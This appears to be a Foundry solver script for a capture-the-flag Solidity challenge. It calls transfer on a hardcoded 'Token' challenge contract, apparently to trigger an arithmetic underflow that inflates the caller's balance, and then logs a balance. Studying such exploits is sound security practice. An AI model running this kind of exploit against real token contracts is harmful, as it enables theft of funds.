pragma solidity ^0.6.0;

import "forge-std/Script.sol";
import "../challs/Token.sol";

contract TokenSolver is Script {
    function run() external {
        vm.startBroadcast();
        Token tken = Token(0x2524fd354a457D537fb590254Fc4B66897cF8AEC);
        tken.transfer(address(0x0), 100);
        tken.transfer(address(0x0), 1);
        console.log("balance : ");
        console.log(tken.balanceOf(0xdCC36b9cbC0dbaDBCCFB2f5dD70e5AdB5024F707));

    }
}